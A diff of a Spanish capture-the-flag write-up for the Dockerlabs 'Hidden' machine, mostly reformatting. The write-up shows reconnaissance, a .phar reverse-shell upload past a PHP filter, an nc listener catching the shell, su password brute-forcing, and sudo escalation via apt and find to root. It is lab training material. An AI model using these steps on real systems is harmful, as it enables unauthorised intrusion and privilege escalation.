@@ -1,22 +1,30 @@
-# 🖥️ Writeup - Hidden 
+---
+icon: linux
+---
 
-**Plataforma:** Dockerlabs  
-**Sistema Operativo:** Linux  
+# Hidden ​​
+
+## 🖥️ Writeup - Hidden
+
+**Plataforma:** Dockerlabs\
+**Sistema Operativo:** Linux
 
 > **Tags:** `Linux` `Web` `File Upload` `RCE` `Bypass` `Brute Force` `Sudoers`
 
-# INSTALACIÓN
+## INSTALACIÓN
 
 Descargamos el `.zip` de la máquina desde DockerLabs a nuestro entorno y seguimos los siguientes pasos.
 
-```bash 
+```bash
 unzip hidden.zip
 ```
+
 La máquina ya está descomprimida y solo falta montarla.
 
 ```bash
 sudo bash auto_deploy.sh hidden.tar
-``` 
+```
+
 Info:
 
 ```
@@ -41,23 +49,24 @@ Estamos desplegando la máquina vulnerable, espere un momento.
 Máquina desplegada, su dirección IP es --> 172.17.0.2
 
 Presiona Ctrl+C cuando termines con la máquina para eliminarla
-``` 
+```
 
 Una vez desplegada, cuando terminemos de hackearla, con un `Ctrl + C` se eliminará automáticamente para que no queden archivos residuales.
 
-# ESCANEO DE PUERTOS
+## ESCANEO DE PUERTOS
 
 A continuación, realizamos un escaneo general para comprobar qué puertos están abiertos y luego uno más exhaustivo para obtener información relevante sobre los servicios.
 
 ```bash
 nmap -n -Pn -sS -sV -p- --open --min-rate 5000 172.17.0.2
-``` 
+```
 
 ```bash
 nmap -n -Pn -sCV -p80 --min-rate 5000 172.17.0.2
 ```
 
 Info:
+
 ```
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-08 20:05 CEST
 Nmap scan report for 172.17.0.2
@@ -84,11 +93,12 @@ We can’t connect to the server at hidden.lab.
 
 Añadimos `hidden.lab` al archivo `/etc/hosts` para que el servicio web sea accesible.
 
-```bash 
+```bash
 sudo nano /etc/hosts
 ```
 
 Info:
+
 ```
 127.0.0.1	localhost
 127.0.1.1	kali
@@ -103,13 +113,14 @@ Al entrar en el navegador, se muestra una página web aparentemente normal que p
 
 A primera vista no hay nada interesante, por lo que utilizamos `Gobuster` para buscar directorios ocultos.
 
-# GOBUSTER
+## GOBUSTER
 
 ```bash
 gobuster dir -u http://hidden.lab -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x html,zip,php,txt,bak,sh -b 403,404 -t 60
 ```
 
-Info: 
+Info:
+
 ```
 ===============================================================
 Gobuster v3.8
@@ -151,6 +162,7 @@ wfuzz -c --hl=9 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-1100
 ```
 
 Info:
+
 ```
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
 ********************************************************
@@ -175,9 +187,6 @@ echo "172.17.0.2	dev.hidden.lab" >> /etc/hosts
 
 Al abrir esta dirección en el navegador, se muestra un panel que solicita subir un CV en formato `PDF`, indicando que no se permiten archivos con extensión `.php`.
 
-![alt text](../images/CV.png)
-
-
 Aunque probablemente bloquee archivos `.php`, podemos probar con extensiones alternativas como `.phar` o `.phtml`. Para ello, creamos un script de reverse shell y lo guardamos con la extensión `.phar`.
 
 ```bash
@@ -186,17 +195,15 @@ sudo nano shell.phar
 
 En mi caso he utilizado el script de `Pentest Monkey`.
 
-Accedemos al formulario de subida, seleccionamos nuestro archivo y lo enviamos. 
+Accedemos al formulario de subida, seleccionamos nuestro archivo y lo enviamos.
 
 ```
 El archivo ha sido subido correctamente.
-``` 
+```
 
 Aparece un mensaje de confirmación indicando que la carga se ha realizado correctamente.
 
 Navegamos al directorio `/uploads`, donde se almacenan los archivos subidos desde el formulario, y comprobamos que nuestro archivo está allí.
-
-![alt text](../images/rshell.png)
 
 Antes de ejecutarlo, configuramos un listener en la máquina atacante.
 
@@ -204,8 +211,8 @@ Antes de ejecutarlo, configuramos un listener en la máquina atacante.
 nc -nlvp 4444
 ```
 
+Info:
 
-Info: 
 ```
 listening on [any] 4444 ...
 connect to [10.0.4.12] from (UNKNOWN) [172.17.0.2] 39318
@@ -216,35 +223,40 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 /bin/sh: 0: can't access tty; job control turned off
 $ 
 ```
+
 Tras lanzar el script, obtenemos una reverse shell con el usuario www-data.
 
-# TTY
+## TTY
 
 Antes de buscar vectores de escalada de privilegios, vamos a hacer un tratamiento de TTY para tener una shell más interactiva, con los siguientes comandos:
 
 ```bash
 script /dev/null -c bash
 ```
+
 `ctrl Z`
+
 ```bash
 stty raw -echo; fg
 ```
+
 ```bash
 reset xterm
 ```
+
 ```bash
 export TERM=xterm
 ```
+
 ```bash
 export BASH=bash
 ```
 
-# ESCALADA DE PRIVILEGIOS
-
+## ESCALADA DE PRIVILEGIOS
 
 Comprobamos permisos `sudo`, `SUID`, `Capabilities`.
 
-```bash 
+```bash
 sudo -l
 ```
 
@@ -281,6 +293,7 @@ chmod +x Linux-Su-Force.sh
 ```
 
 Info:
+
 ```
 ./Linux-Su-Force.sh cafetero rockyou.txt 
 ------------------------------------------------
@@ -297,11 +310,12 @@ Con estas credenciales accedemos correctamente como el usuario `cafetero`.
 
 Comprobamos permisos `sudo`, `SUID`, `Capabilities`.
 
-```bash 
+```bash
 sudo -l
 ```
 
 Info:
+
 ```
 Matching Defaults entries for cafetero on 507ac954e9cf:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
@@ -329,6 +343,7 @@ clear
 ```
 
 Info:
+
 ```
 john@507ac954e9cf:/home/cafetero$ whoami
 john
@@ -338,11 +353,12 @@ De este modo, pivotamos al usuario `john`.
 
 Comprobamos permisos `sudo`, `SUID`, `Capabilities`.
 
-```bash 
+```bash
 sudo -l
 ```
 
 Info:
+
 ```
 Matching Defaults entries for john on 507ac954e9cf:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
@@ -359,6 +375,7 @@ sudo -u bobby apt changelog apt
 ```
 
 Info:
+
 ```
 bobby@507ac954e9cf:/home/cafetero$ whoami
 bobby
@@ -368,11 +385,12 @@ De este modo, pivotamos al usuario `bobby`.
 
 Comprobamos permisos `sudo`, `SUID`, `Capabilities`.
 
-```bash 
+```bash
 sudo -l
 ```
 
 Info:
+
 ```
 Matching Defaults entries for bobby on 507ac954e9cf:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
@@ -388,6 +406,7 @@ sudo find . -exec /bin/sh \; -quit
 ```
 
 Info:
+
 ```
 # whoami
 root
